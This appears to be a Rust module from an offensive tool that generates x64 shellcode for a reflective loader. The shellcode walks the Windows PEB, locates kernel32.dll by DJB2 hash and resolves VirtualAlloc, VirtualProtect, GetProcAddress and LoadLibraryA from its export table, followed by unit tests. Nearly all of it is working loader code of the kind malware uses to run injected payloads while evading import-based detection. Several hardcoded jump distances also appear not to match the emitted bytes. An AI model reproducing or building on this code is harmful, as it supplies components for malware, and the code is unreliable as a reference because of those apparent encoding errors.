//! PEB (Process Environment Block) walking shellcode for resolving Windows APIs.
//!
//! This module generates position-independent x64 shellcode that:
//! 1. Accesses the PEB via gs:[0x60]
//! 2. Walks the module list (PEB_LDR_DATA)
//! 3. Finds kernel32.dll by hashing DLL names
//! 4. Parses kernel32's export table
//! 5. Resolves required API functions by hash
//! 6. Stores resolved addresses in an API table
//!
//! This is used by the reflective loader to bootstrap API access without
//! calling LoadLibrary or having import table dependencies.

/// DJB2 hash algorithm for string hashing in PIC.
///
/// This is a simple but effective hash function that's easy to implement
/// in position-independent assembly code.
pub const fn hash_string_djb2(s: &str) -> u32 {
    let bytes = s.as_bytes();
    let mut hash: u32 = 5381;
    let mut i = 0;

    while i < bytes.len() {
        let byte = bytes[i];
        // Convert to uppercase for case-insensitive comparison
        let b = if byte >= b'a' && byte <= b'z' {
            byte - 32
        } else {
            byte
        };
        hash = hash.wrapping_mul(33).wrapping_add(b as u32);
        i += 1;
    }
    hash
}

// Pre-computed hash constants for fast lookup
pub const KERNEL32_HASH: u32 = hash_string_djb2("KERNEL32.DLL");
pub const NTDLL_HASH: u32 = hash_string_djb2("NTDLL.DLL");

// API function hashes (case-insensitive)
pub const VIRTUALALLOC_HASH: u32 = hash_string_djb2("VirtualAlloc");
pub const VIRTUALPROTECT_HASH: u32 = hash_string_djb2("VirtualProtect");
pub const GETPROCADDRESS_HASH: u32 = hash_string_djb2("GetProcAddress");
pub const LOADLIBRARYA_HASH: u32 = hash_string_djb2("LoadLibraryA");

/// Size of the API address table (4 APIs × 8 bytes each for x64 pointers)
pub const API_TABLE_SIZE: usize = 4 * 8;

/// Generate x64 position-independent shellcode that walks PEB and resolves kernel32 APIs.
///
/// The generated shellcode:
/// - Accesses PEB via gs:[0x60]
/// - Walks PEB_LDR_DATA → InMemoryOrderModuleList
/// - Finds kernel32.dll by hashing module names
/// - Parses kernel32 export table
/// - Resolves VirtualAlloc, VirtualProtect, GetProcAddress, LoadLibraryA by hash
/// - Stores resolved addresses at offset specified by `api_table_offset`
///
/// # Arguments
/// * `api_table_offset` - Offset from shellcode start where API addresses will be stored
///
/// # Returns
/// Position-independent x64 machine code
pub fn generate_peb_parse_x64(api_table_offset: usize) -> Vec<u8> {
    let mut shellcode = Vec::new();

    // ============================================================================
    // PART 1: Locate PEB and walk module list to find kernel32.dll
    // ============================================================================

    // Get PEB from gs:[0x60] (x64 TEB offset)
    // mov rax, gs:[0x60]
    shellcode.extend_from_slice(&[0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00]);

    // Get PEB_LDR_DATA from PEB.Ldr (offset 0x18)
    // mov rax, [rax + 0x18]
    shellcode.extend_from_slice(&[0x48, 0x8B, 0x40, 0x18]);

    // Get InMemoryOrderModuleList head (offset 0x20 in PEB_LDR_DATA)
    // mov rsi, [rax + 0x20]
    shellcode.extend_from_slice(&[0x48, 0x8B, 0x70, 0x20]);

    // Save list head for termination check
    // mov rdi, rsi
    shellcode.extend_from_slice(&[0x48, 0x89, 0xF7]);

    // ============================================================================
    // PART 2: Loop through modules and hash names
    // ============================================================================

    // .module_loop:
    let module_loop_offset = shellcode.len();

    // Get next module: rsi = [rsi] (Flink)
    // mov rsi, [rsi]
    shellcode.extend_from_slice(&[0x48, 0x8B, 0x36]);

    // Check if we've looped back to head (rsi == rdi)
    // cmp rsi, rdi
    shellcode.extend_from_slice(&[0x48, 0x39, 0xFE]);

    // je .not_found (placeholder jump, will be patched later)
    shellcode.extend_from_slice(&[0x0F, 0x84]);
    let not_found_jump_patch_offset = shellcode.len();
    shellcode.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Placeholder for jump offset

    // Get BaseDllName.Buffer (offset 0x50 in LDR_DATA_TABLE_ENTRY)
    // mov rdx, [rsi + 0x50]
    shellcode.extend_from_slice(&[0x48, 0x8B, 0x56, 0x50]);

    // Get BaseDllName.Length (offset 0x48)
    // movzx rcx, word ptr [rsi + 0x48]
    shellcode.extend_from_slice(&[0x48, 0x0F, 0xB7, 0x4E, 0x48]);

    // Hash the module name
    // Call hash_unicode_string (inline implementation)
    // Input: rdx = string buffer (Unicode), rcx = length in bytes
    // Output: eax = hash
    // Clobbers: rbx

    // Initialize hash: eax = 5381
    shellcode.extend_from_slice(&[0xB8]);
    shellcode.extend_from_slice(&5381u32.to_le_bytes());

    // Check if length is 0
    // test rcx, rcx
    shellcode.extend_from_slice(&[0x48, 0x85, 0xC9]);

    // jz .hash_done
    shellcode.extend_from_slice(&[0x74, 0x1E]); // Skip 30 bytes ahead to hash_done

    // shr rcx, 1 (convert byte length to character count for Unicode)
    shellcode.extend_from_slice(&[0x48, 0xD1, 0xE9]);

    // .hash_loop:
    let hash_loop_offset_rel = shellcode.len();

    // movzx ebx, word ptr [rdx] (load Unicode character)
    shellcode.extend_from_slice(&[0x0F, 0xB7, 0x1A]);

    // Convert to uppercase if lowercase (simple ASCII)
    // cmp bl, 'a'
    shellcode.extend_from_slice(&[0x80, 0xFB, 0x61]);

    // jl .not_lowercase
    shellcode.extend_from_slice(&[0x7C, 0x06]); // Skip 6 bytes

    // cmp bl, 'z'
    shellcode.extend_from_slice(&[0x80, 0xFB, 0x7A]);

    // jg .not_lowercase
    shellcode.extend_from_slice(&[0x7F, 0x02]); // Skip 2 bytes

    // sub bl, 32 (convert to uppercase)
    shellcode.extend_from_slice(&[0x80, 0xEB, 0x20]);

    // .not_lowercase:
    // hash = hash * 33 + char
    // imul eax, eax, 33
    shellcode.extend_from_slice(&[0x6B, 0xC0, 0x21]);

    // add eax, ebx
    shellcode.extend_from_slice(&[0x01, 0xD8]);

    // add rdx, 2 (next Unicode character)
    shellcode.extend_from_slice(&[0x48, 0x83, 0xC2, 0x02]);

    // dec rcx
    shellcode.extend_from_slice(&[0x48, 0xFF, 0xC9]);

    // jnz .hash_loop
    let hash_loop_back = (hash_loop_offset_rel as i8).wrapping_sub(shellcode.len() as i8 + 2);
    shellcode.extend_from_slice(&[0x75, hash_loop_back as u8]);

    // .hash_done:
    // Compare with KERNEL32_HASH
    // cmp eax, KERNEL32_HASH
    shellcode.extend_from_slice(&[0x3D]);
    shellcode.extend_from_slice(&KERNEL32_HASH.to_le_bytes());

    // jne .module_loop (try next module)
    let loop_back_offset = (module_loop_offset as i32).wrapping_sub(shellcode.len() as i32 + 6);
    shellcode.extend_from_slice(&[0x0F, 0x85]);
    shellcode.extend_from_slice(&loop_back_offset.to_le_bytes());

    // ============================================================================
    // PART 3: Found kernel32.dll - Parse export table
    // ============================================================================

    // kernel32 base address is at [rsi + 0x20] (DllBase)
    // mov rbx, [rsi + 0x20]
    shellcode.extend_from_slice(&[0x48, 0x8B, 0x5E, 0x20]);

    // Get DOS header → e_lfanew
    // mov edx, [rbx + 0x3C]
    shellcode.extend_from_slice(&[0x8B, 0x53, 0x3C]);

    // Get NT headers: rbx + e_lfanew
    // add rdx, rbx
    shellcode.extend_from_slice(&[0x48, 0x01, 0xDA]);

    // Get export directory RVA (offset 0x88 in NT headers for x64)
    // mov edx, [rdx + 0x88]
    shellcode.extend_from_slice(&[0x8B, 0x92, 0x88, 0x00, 0x00, 0x00]);

    // Get export directory address: rbx + export_rva
    // add rdx, rbx
    shellcode.extend_from_slice(&[0x48, 0x01, 0xDA]);

    // Now rdx points to IMAGE_EXPORT_DIRECTORY
    // Get NumberOfNames (offset 0x18)
    // mov ecx, [rdx + 0x18]
    shellcode.extend_from_slice(&[0x8B, 0x4A, 0x18]);

    // Get AddressOfNames RVA (offset 0x20)
    // mov r8d, [rdx + 0x20]
    shellcode.extend_from_slice(&[0x44, 0x8B, 0x42, 0x20]);

    // Convert to VA: r8 = rbx + AddressOfNames
    // add r8, rbx
    shellcode.extend_from_slice(&[0x49, 0x01, 0xD8]);

    // Get AddressOfNameOrdinals RVA (offset 0x24)
    // mov r9d, [rdx + 0x24]
    shellcode.extend_from_slice(&[0x44, 0x8B, 0x4A, 0x24]);

    // Convert to VA: r9 = rbx + AddressOfNameOrdinals
    // add r9, rbx
    shellcode.extend_from_slice(&[0x49, 0x01, 0xD9]);

    // Get AddressOfFunctions RVA (offset 0x1C)
    // mov r10d, [rdx + 0x1C]
    shellcode.extend_from_slice(&[0x44, 0x8B, 0x52, 0x1C]);

    // Convert to VA: r10 = rbx + AddressOfFunctions
    // add r10, rbx
    shellcode.extend_from_slice(&[0x49, 0x01, 0xDA]);

    // Save export directory pointer
    // mov r11, rdx
    shellcode.extend_from_slice(&[0x49, 0x89, 0xD3]);

    // ============================================================================
    // PART 4: Resolve each required API by hash
    // ============================================================================

    // We need to resolve 4 APIs:
    // - VirtualAlloc
    // - VirtualProtect
    // - GetProcAddress
    // - LoadLibraryA

    // r12 will store the API table address
    // Get current RIP using call/pop trick
    // call .get_rip
    shellcode.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]);

    // .get_rip:
    // pop r12
    shellcode.extend_from_slice(&[0x41, 0x5C]);

    // Adjust to shellcode base (subtract current offset)
    // sub r12, <current_offset>
    let current_offset = shellcode.len() as u32 + 6; // Account for the sub instruction itself
    shellcode.extend_from_slice(&[0x49, 0x81, 0xEC]);
    shellcode.extend_from_slice(&current_offset.to_le_bytes());

    // Add api_table_offset to get API table address
    // add r12, <api_table_offset>
    shellcode.extend_from_slice(&[0x49, 0x81, 0xC4]);
    shellcode.extend_from_slice(&(api_table_offset as u32).to_le_bytes());

    // r13 will be the current API table index (0, 8, 16, 24)
    // xor r13, r13
    shellcode.extend_from_slice(&[0x4D, 0x31, 0xED]);

    // r14 will hold the target hash
    // Array of hashes to find (we'll load one at a time)
    let api_hashes = [
        VIRTUALALLOC_HASH,
        VIRTUALPROTECT_HASH,
        GETPROCADDRESS_HASH,
        LOADLIBRARYA_HASH,
    ];

    for target_hash in &api_hashes {
        // .find_api:
        // Load target hash into r14d
        // mov r14d, <target_hash>
        shellcode.extend_from_slice(&[0x41, 0xBE]);
        shellcode.extend_from_slice(&target_hash.to_le_bytes());

        // Save NumberOfNames for inner loop
        // push rcx
        shellcode.extend_from_slice(&[0x51]);

        // Save r8, r9, r10 (will be modified in loop)
        // push r8
        shellcode.extend_from_slice(&[0x41, 0x50]);

        // push r9
        shellcode.extend_from_slice(&[0x41, 0x51]);

        // push r10
        shellcode.extend_from_slice(&[0x41, 0x52]);

        // Reset counter for name loop: r15 = 0
        // xor r15, r15
        shellcode.extend_from_slice(&[0x4D, 0x31, 0xFF]);

        // .name_loop:
        let name_loop_start = shellcode.len();

        // Check if we've checked all names
        // cmp r15d, ecx
        shellcode.extend_from_slice(&[0x44, 0x39, 0xF9]);

        // jge .api_not_found (shouldn't happen for kernel32 APIs)
        shellcode.extend_from_slice(&[0x0F, 0x8D]);
        let api_not_found_patch = shellcode.len();
        shellcode.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // Placeholder

        // Get name RVA from AddressOfNames array
        // mov edx, [r8 + r15 * 4]
        shellcode.extend_from_slice(&[0x42, 0x8B, 0x14, 0xB8]);

        // Convert to VA: rdx = rbx + name_rva
        // add rdx, rbx
        shellcode.extend_from_slice(&[0x48, 0x01, 0xDA]);

        // Hash the function name (ANSI string this time)
        // Input: rdx = string pointer
        // Output: eax = hash

        // Initialize hash: eax = 5381
        shellcode.extend_from_slice(&[0xB8]);
        shellcode.extend_from_slice(&5381u32.to_le_bytes());

        // .ansi_hash_loop:
        let ansi_hash_loop = shellcode.len();

        // movzx edi, byte ptr [rdx]
        shellcode.extend_from_slice(&[0x0F, 0xB6, 0x3A]);

        // test dil, dil (check for null terminator)
        shellcode.extend_from_slice(&[0x40, 0x84, 0xFF]);

        // jz .ansi_hash_done
        shellcode.extend_from_slice(&[0x74, 0x13]); // Skip 19 bytes

        // Convert to uppercase if needed
        // cmp dil, 'a'
        shellcode.extend_from_slice(&[0x40, 0x80, 0xFF, 0x61]);

        // jl .ansi_not_lower
        shellcode.extend_from_slice(&[0x7C, 0x06]);

        // cmp dil, 'z'
        shellcode.extend_from_slice(&[0x40, 0x80, 0xFF, 0x7A]);

        // jg .ansi_not_lower
        shellcode.extend_from_slice(&[0x7F, 0x02]);

        // sub dil, 32
        shellcode.extend_from_slice(&[0x40, 0x80, 0xEF, 0x20]);

        // .ansi_not_lower:
        // hash = hash * 33 + char
        // imul eax, eax, 33
        shellcode.extend_from_slice(&[0x6B, 0xC0, 0x21]);

        // add eax, edi
        shellcode.extend_from_slice(&[0x01, 0xF8]);

        // inc rdx
        shellcode.extend_from_slice(&[0x48, 0xFF, 0xC2]);

        // jmp .ansi_hash_loop
        let ansi_loop_back = (ansi_hash_loop as i8).wrapping_sub(shellcode.len() as i8 + 2);
        shellcode.extend_from_slice(&[0xEB, ansi_loop_back as u8]);

        // .ansi_hash_done:
        // Compare with target hash
        // cmp eax, r14d
        shellcode.extend_from_slice(&[0x41, 0x39, 0xC6]);

        // je .found_api
        shellcode.extend_from_slice(&[0x74, 0x05]); // Skip 5 bytes to found_api

        // inc r15 (try next name)
        shellcode.extend_from_slice(&[0x49, 0xFF, 0xC7]);

        // jmp .name_loop
        let name_loop_back = (name_loop_start as i32).wrapping_sub(shellcode.len() as i32 + 5);
        shellcode.extend_from_slice(&[0xE9]);
        shellcode.extend_from_slice(&name_loop_back.to_le_bytes());

        // .found_api:
        // Get ordinal from AddressOfNameOrdinals[r15]
        // movzx edx, word ptr [r9 + r15 * 2]
        shellcode.extend_from_slice(&[0x42, 0x0F, 0xB7, 0x14, 0x79]);

        // Get function RVA from AddressOfFunctions[ordinal]
        // mov edx, [r10 + rdx * 4]
        shellcode.extend_from_slice(&[0x41, 0x8B, 0x14, 0x92]);

        // Convert to VA: rdx = rbx + function_rva
        // add rdx, rbx
        shellcode.extend_from_slice(&[0x48, 0x01, 0xDA]);

        // Store in API table: [r12 + r13] = rdx
        // mov [r12 + r13], rdx
        shellcode.extend_from_slice(&[0x4B, 0x89, 0x14, 0x2C]);

        // Restore r10, r9, r8, rcx
        // pop r10
        shellcode.extend_from_slice(&[0x41, 0x5A]);

        // pop r9
        shellcode.extend_from_slice(&[0x41, 0x59]);

        // pop r8
        shellcode.extend_from_slice(&[0x41, 0x58]);

        // pop rcx
        shellcode.extend_from_slice(&[0x59]);

        // Advance API table index: r13 += 8
        // add r13, 8
        shellcode.extend_from_slice(&[0x49, 0x83, 0xC5, 0x08]);

        // Patch api_not_found jump to here
        let current_offset = shellcode.len();
        let api_not_found_jump_offset = (current_offset as i32) - (api_not_found_patch as i32) - 4;
        let patch_pos = api_not_found_patch;
        shellcode[patch_pos..patch_pos + 4]
            .copy_from_slice(&api_not_found_jump_offset.to_le_bytes());
    }

    // ============================================================================
    // PART 5: Return
    // ============================================================================

    // ret (return to caller, APIs are now resolved in table)
    shellcode.extend_from_slice(&[0xC3]);

    // .not_found:
    // Patch the not_found jump from module loop
    let not_found_offset = shellcode.len();
    let not_found_jump_offset =
        (not_found_offset as i32) - (not_found_jump_patch_offset as i32) - 4;
    let patch_pos = not_found_jump_patch_offset;
    shellcode[patch_pos..patch_pos + 4].copy_from_slice(&not_found_jump_offset.to_le_bytes());

    // int3 (should never reach here - kernel32 should always be loaded)
    shellcode.extend_from_slice(&[0xCC]);

    shellcode
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_djb2_hash() {
        // Test basic hash function
        let hash = hash_string_djb2("KERNEL32.DLL");
        assert_ne!(hash, 0);

        // Test case insensitivity
        let hash1 = hash_string_djb2("KERNEL32.DLL");
        let hash2 = hash_string_djb2("kernel32.dll");
        assert_eq!(hash1, hash2);
    }

    #[test]
    fn test_hash_constants() {
        // Verify hash constants match function
        assert_eq!(KERNEL32_HASH, hash_string_djb2("KERNEL32.DLL"));
        assert_eq!(NTDLL_HASH, hash_string_djb2("NTDLL.DLL"));
        assert_eq!(VIRTUALALLOC_HASH, hash_string_djb2("VirtualAlloc"));
        assert_eq!(
            VIRTUALPROTECT_HASH,
            hash_string_djb2("VirtualProtect")
        );
        assert_eq!(
            GETPROCADDRESS_HASH,
            hash_string_djb2("GetProcAddress")
        );
        assert_eq!(LOADLIBRARYA_HASH, hash_string_djb2("LoadLibraryA"));
    }

    #[test]
    fn test_api_hashes_unique() {
        // Ensure no hash collisions
        let hashes = [
            VIRTUALALLOC_HASH,
            VIRTUALPROTECT_HASH,
            GETPROCADDRESS_HASH,
            LOADLIBRARYA_HASH,
        ];

        for (i, &hash1) in hashes.iter().enumerate() {
            for (j, &hash2) in hashes.iter().enumerate() {
                if i != j {
                    assert_ne!(hash1, hash2, "Hash collision detected");
                }
            }
        }
    }

    #[test]
    fn test_generate_peb_parse_x64() {
        let shellcode = generate_peb_parse_x64(0x1000);

        // Should generate non-empty shellcode
        assert!(!shellcode.is_empty());

        // Should start with gs: segment override for PEB access
        assert_eq!(shellcode[0], 0x65); // gs: prefix

        // Should end with ret (0xC3)
        let last_ret_pos = shellcode.iter().rposition(|&b| b == 0xC3);
        assert!(last_ret_pos.is_some(), "Shellcode should contain ret");

        log::info!("PEB walker shellcode size: {} bytes", shellcode.len());
    }

    #[test]
    fn test_api_table_size() {
        // API table must fit 4 x64 pointers
        assert_eq!(API_TABLE_SIZE, 32);
    }

    #[test]
    fn test_shellcode_starts_with_gs_prefix() {
        let shellcode = generate_peb_parse_x64(0x1000);

        // Should start with gs:[0x60] access
        assert_eq!(shellcode[0], 0x65, "Should have gs: segment override");
    }

    #[test]
    fn test_shellcode_ends_with_ret() {
        let shellcode = generate_peb_parse_x64(0x1000);

        // Find the last ret instruction (0xC3)
        let last_ret = shellcode.iter().rposition(|&b| b == 0xC3);
        assert!(
            last_ret.is_some(),
            "Shellcode should contain at least one ret instruction"
        );
    }

    #[test]
    fn test_kernel32_hash_uniqueness() {
        // Kernel32 hash should be different from ntdll
        assert_ne!(KERNEL32_HASH, NTDLL_HASH);
    }

    #[test]
    fn test_djb2_empty_string() {
        let hash = hash_string_djb2("");
        assert_eq!(hash, 5381); // Should be initial value for empty string
    }

    #[test]
    fn test_djb2_single_char() {
        let hash = hash_string_djb2("A");
        assert_ne!(hash, 5381); // Should change from initial value
    }

    #[test]
    fn test_hash_case_insensitive_various() {
        let test_cases = vec![
            ("VirtualAlloc", "VIRTUALALLOC"),
            ("GetProcAddress", "getprocaddress"),
            ("LoadLibraryA", "loadlibrarya"),
        ];

        for (lower, upper) in test_cases {
            let hash1 = hash_string_djb2(lower);
            let hash2 = hash_string_djb2(upper);
            assert_eq!(hash1, hash2, "Hash should be case-insensitive for {}", lower);
        }
    }

    #[test]
    fn test_shellcode_size_reasonable() {
        let shellcode = generate_peb_parse_x64(0x1000);

        // Shellcode should be reasonably sized (not empty, not huge)
        assert!(shellcode.len() > 100, "Shellcode too small");
        assert!(shellcode.len() < 10000, "Shellcode unexpectedly large");

        log::info!("PEB walker shellcode size: {} bytes (within expected range)", shellcode.len());
    }

    #[test]
    fn test_different_api_table_offsets() {
        // Generate shellcode with different API table offsets
        let shellcode1 = generate_peb_parse_x64(0x1000);
        let shellcode2 = generate_peb_parse_x64(0x2000);

        // Both should generate valid shellcode
        assert!(!shellcode1.is_empty());
        assert!(!shellcode2.is_empty());

        // Size may differ slightly due to offset encoding
        log::info!("Shellcode with offset 0x1000: {} bytes", shellcode1.len());
        log::info!("Shellcode with offset 0x2000: {} bytes", shellcode2.len());
    }
}
